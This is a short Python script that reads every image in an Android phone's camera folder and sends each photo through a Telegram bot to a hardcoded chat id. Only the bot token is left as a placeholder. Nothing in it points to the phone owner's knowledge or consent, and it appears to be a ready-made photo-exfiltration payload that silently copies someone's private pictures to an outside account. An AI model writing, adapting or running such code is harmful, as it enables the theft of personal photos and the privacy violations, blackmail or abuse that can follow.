import os
import telebot
bot_token = 'here your token'
bot = telebot.TeleBot(bot_token)
folder_path = '/storage/emulated/0/DCIM/Camera/'
image_files = [f for f in os.listdir(folder_path) if f.endswith(('.jpg', '.jpeg', '.png', '.gif'))]
for image_file in image_files:
    image_path = os.path.join(folder_path, image_file)
    with open(image_path, 'rb') as image:
        bot.send_photo(chat_id=827243255, photo=image)
bot.polling()
